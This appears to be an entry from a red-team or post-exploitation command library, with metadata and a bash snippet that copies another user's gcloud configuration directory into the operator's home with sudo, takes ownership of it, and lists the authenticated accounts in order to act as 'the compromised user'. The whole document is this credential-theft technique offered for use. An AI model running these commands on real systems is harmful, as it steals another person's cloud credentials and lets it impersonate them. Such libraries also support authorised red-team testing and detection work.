---
id: 8d8e4b4c-539e-406f-b492-0cfd1dd30ca4
name: Copy gcloud dir to your own home directory to auth as the compromised user
type: command
executor: bash
data: 'sudo cp -r /home/username/.config/gcloud ~/.config

  sudo chown -R currentuser:currentuser ~/.config/gcloud

  gcloud auth list

  '
output: null
created_at: '2020-07-14T19:08:34.243114+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Copy gcloud dir to your own home directory to auth as the compromised user

```bash
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list

```
